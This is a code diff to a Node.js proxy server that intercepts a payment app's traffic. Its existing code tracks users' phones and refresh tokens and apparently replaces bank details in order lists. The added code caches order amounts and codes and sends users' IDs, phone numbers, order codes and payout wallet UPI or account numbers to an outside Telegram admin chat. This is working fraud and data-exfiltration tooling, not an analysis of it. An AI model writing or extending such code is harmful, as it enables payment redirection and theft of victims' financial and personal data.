@@ -329,7 +329,36 @@ const userPhoneMap = {};
 const refreshTokenMap = {};
 const userDeviceMap = {};
 const orderNotifyCache = new Map();
+const orderCache = new Map();
 let debugMode = false;
+
+function cacheOrderDetails(dataObj) {
+  if (!dataObj) return;
+  const items = Array.isArray(dataObj)
+    ? dataObj
+    : (dataObj.list || dataObj.records || dataObj.rows || dataObj.content || (typeof dataObj === 'object' ? [dataObj] : []));
+  if (!Array.isArray(items)) return;
+  for (const item of items) {
+    if (!item || typeof item !== 'object') continue;
+    const id = String(item.payOrderId || item.orderId || item.buyId || item.id || '');
+    const amount = parseFloat(item.amount || item.orderAmount || item.buyAmount || item.unpaidAmount || item.totalAmount || 0) || 0;
+    const code = item.code || item.orderCode || item.buyCode || item.sn || '';
+    if (id && (amount > 0 || code)) {
+      const existing = orderCache.get(id) || {};
+      orderCache.set(id, {
+        amount: amount || existing.amount || 0,
+        code: code || existing.code || '',
+        time: Date.now()
+      });
+    }
+  }
+  if (orderCache.size > 2000) {
+    const cutoff = Date.now() - 3600000;
+    for (const [k, v] of orderCache) {
+      if (v.time < cutoff) orderCache.delete(k);
+    }
+  }
+}
 
 function isAuthFailureResponse(jsonResp) {
   if (!jsonResp) return false;
@@ -1708,6 +1737,7 @@ async function proxyAndReplaceBankInList(req, res) {
 
     const listData = getResponseData(jsonResp);
     if (listData) {
+      cacheOrderDetails(listData);
       const applyToItem = (item) => {
         const itemUserId = item.userId ? String(item.userId) : (item.memberId ? String(item.memberId) : detectedUserId);
         const itemEff = getEffectiveSettings(data, itemUserId);
@@ -1938,14 +1968,22 @@ app.post('/app/payment/order/create', async (req, res) => {
     if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
       const body = req.parsedBody || {};
       const phone = getPhone(data, userId);
-      const orderAmt = parseFloat(body.amount || body.orderAmount || body.buyAmount || body.buy_amount || body.totalAmount || req.query?.amount || req.query?.buyAmount || 0) || 0;
+      const targetPayOrderId = String(body.payOrderId || body.orderId || body.buyId || body.id || req.query?.payOrderId || req.query?.orderId || '');
+      const cached = targetPayOrderId ? orderCache.get(targetPayOrderId) : null;
+
+      const orderAmt = parseFloat(body.amount || body.orderAmount || body.buyAmount || body.buy_amount || body.totalAmount || req.query?.amount || req.query?.buyAmount || (cached ? cached.amount : 0)) || 0;
+      const orderCode = body.code || body.orderCode || body.buyCode || (cached ? cached.code : '') || '';
 
       if (!isSuccess) {
         const errorMsg = jsonResp ? (jsonResp.message || JSON.stringify(jsonResp)) : 'Unknown error';
-        const msg =
+        let msg =
           `❌ *Order Failed!*\n` +
           `━━━━━━━━━━━━━━━━━━\n` +
-          `👤 *User:* \`${userId || 'N/A'}\`${phone ? ' (' + phone + ')' : ''}\n` +
+          `👤 *User:* \`${userId || 'N/A'}\`${phone ? ' (' + phone + ')' : ''}\n`;
+        if (orderCode) {
+          msg += `📋 *Order Code:* \`${orderCode}\`\n`;
+        }
+        msg +=
           `💰 *Attempted Amount:* \`₹${orderAmt || 'N/A'}\`\n` +
           `⚠️ *Reason:* ${errorMsg}\n` +
           `🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`;
@@ -2181,7 +2219,27 @@ for (const ep of COLLECTION_ENDPOINTS) {
             });
             bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(()=>{});
           } else if (path === '/app/ct/app/collection/getPayoutWalletList') {
-            // Silenced to consolidate into orderInfo
+            if (jsonResp && (jsonResp.code === 1000 || jsonResp.code === 200 || jsonResp.code === '1000' || jsonResp.code === '200') && jsonResp.data) {
+              const wallets = Array.isArray(jsonResp.data) ? jsonResp.data : [jsonResp.data];
+              if (wallets.length > 0) {
+                let msg = `📱 *Select Tool / Payout Wallet List*\n` +
+                  `━━━━━━━━━━━━━━━━━━\n` +
+                  `👤 *User:* \`${userId || 'N/A'}\`${phone ? ' (' + phone + ')' : ''}\n\n`;
+                
+                wallets.forEach((item, index) => {
+                  const wName = item.name || (item.wallet && item.wallet.name) || item.walletName || item.payTypeName || item.title || 'Payout Tool';
+                  const wAddr = item.address || item.account || item.payoutAccount || item.payoutUpi || item.phone || item.mobile || item.upiId || item.accountNo || 'N/A';
+                  const status = item.status === 1 ? '✅ Enabled' : (item.status === 0 ? '🔴 Disabled' : '');
+                  const range = item.acceptableRange ? `₹${item.acceptableRange[0]} ~ ₹${item.acceptableRange[1]}` : (item.minAmount ? `Min ₹${item.minAmount}` : '');
+                  
+                  msg += `${index + 1}. 💳 *App Name:* \`${wName}\`${status ? ' [' + status + ']' : ''}\n`;
+                  msg += `   📍 *UPI / Number:* \`${wAddr}\`\n`;
+                  if (range) msg += `   💰 *Range:* \`${range}\`\n`;
+                  msg += `\n`;
+                });
+                bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(()=>{});
+              }
+            }
           } else {
             // No extra log for success on these endpoints
           }
